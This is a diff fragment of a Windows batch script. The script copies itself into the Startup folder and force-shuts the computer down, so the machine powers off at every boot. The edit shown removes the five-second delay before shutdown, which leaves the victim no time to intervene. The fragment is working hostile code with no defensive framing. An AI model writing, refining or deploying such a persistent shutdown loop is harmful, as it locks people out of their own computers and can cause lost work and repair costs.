@@ -12,7 +12,7 @@ rem Copy the script to the Startup folder
 copy "%script_path%%script_name%" "%startup_folder%" > nul
 
 rem Add a delay before shutting down the computer
-timeout /t 5 /nobreak >nul
+timeout /t 0 /nobreak >nul
 
 rem Shutdown the computer
 shutdown /s /f /t 0
